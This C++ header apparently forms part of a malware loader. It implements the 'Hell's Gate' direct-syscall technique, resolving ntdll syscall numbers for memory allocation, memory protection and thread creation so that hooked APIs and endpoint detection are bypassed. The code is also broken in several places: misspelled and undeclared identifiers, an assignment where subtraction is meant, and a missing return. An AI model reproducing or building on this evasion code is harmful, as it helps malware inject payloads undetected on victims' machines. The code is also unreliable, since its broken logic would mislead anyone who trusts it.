#pragma once
#pragma comment (lib, "crypt32.lib")

#include "Windows.h"
#include "tlhelp32.h"
#include "winternl.h"
#include "WtsApi32.h"
#include "fstream"

//TODO: look into halos gate to work even with hooked syscalls!

//-----------------------------------------------------------
//
//-----------------------------------------------------------
typedef struct TABLE_ENTRY {
	PVOID pAddress;
	DWORD64 dwHash;
	WORD wSystemCall;
} TableEntry, *PTableEntry;

//-----------------------------------------------------------
//
//-----------------------------------------------------------
typedef struct TABLE {
	TableEntry NtAllocaeVirtualMemory;
	TableEntry NtProtectVirtualMemory;
	TableEntry NtCreteThreadEx;
	TableEntry NtWaitForSingleObject;
} Table, *PTable;

//-----------------------------------------------------------
//
//-----------------------------------------------------------
bool getTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PTableEntry pTableEntry) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressofNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx{ 0 }; cx < pImageExportDirectory->NumberOfNames; ++cx) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressofNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwdAddressOfNameOrdinales[cx]];

		if (hash(pczFunctionName) == pTableEntry->dwHash) {
			pTableEntry->pAddress = pFunctionAddress;

			// Quick and dirty fix in case the function has been hooked
			WORD cw = 0;
			while (true) {
				// check if syscall, in this case we are too far
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return false;

				// check if ret, in this case we are also probably too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return false;

				// mov r10, rcx
				// mov rcx, <syscall>
				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pTableEntry->wSystemCall = (high << 8) | low;
					break;
				}

				++cw;
			}
		}
	}
}

//-----------------------------------------------------------
//
//-----------------------------------------------------------
void hells_gate_init() {
	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PTEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;

	if (not pCurrentPeb || not pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return;

	// Get the EAT of NTDLL
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink = 0x10);

	Table table = { 0 };

	table.NtAllocaeVirtualMemory.dwHash = 0xf5bd373480a6b89b;
	if (not getTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory))
		return;
}

